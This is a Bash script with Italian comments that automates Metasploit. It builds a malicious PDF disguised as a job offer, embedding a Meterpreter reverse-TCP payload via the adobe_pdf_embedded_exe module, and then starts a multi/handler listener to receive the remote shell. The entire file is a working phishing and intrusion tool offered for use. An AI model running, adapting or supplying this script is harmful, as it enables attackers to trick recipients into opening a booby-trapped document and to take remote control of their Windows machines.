#!/usr/bin/env bash
set -euo pipefail

# --- Parametri ---
LHOST="192.168.80.131"
LPORT="4444"
TEMPLATE="/PATH/TO/template_msf.pdf"
OUTPUT="offerta_lavorativa_automation.pdf"

# --- Funzione: crea il PDF malevolo ---
create_pdf() {
  echo "[*] Generazione PDF malevolo..."
  RCFILE=$(mktemp /tmp/msf_pdf_XXXXXXXX.rc)
  cat > "${RCFILE}" <<EOF
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT ${LPORT}
set INFILENAME ${TEMPLATE}
set FILENAME ${OUTPUT}
exploit
exit
EOF
  # Esegui Metasploit in batch
  msfconsole -q -r "${RCFILE}"
  rm -f "${RCFILE}"
  echo "[*] PDF creato: ${OUTPUT}"
}

# --- Funzione: avvia il listener multi/handler ---
start_handler() {
  echo "[*] Avvio listener (handler)…"
  msfconsole -q -x "use exploit/multi/handler; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST ${LHOST}; \
set LPORT ${LPORT}; \
run"
}

# --- Menu di selezione ---
echo "Seleziona un'opzione:"
echo "  1) Crea solo il PDF malevolo"
echo "  2) Avvia solo il listener"
echo "  3) Crea il PDF e poi avvia il listener"
read -rp "Scelta [1-3]: " choice

case "${choice}" in
  1)
    create_pdf
    ;;
  2)
    start_handler
    ;;
  3)
    create_pdf
    start_handler
    ;;
  *)
    echo "Opzione non valida. Esci."
    exit 1
    ;;
esac
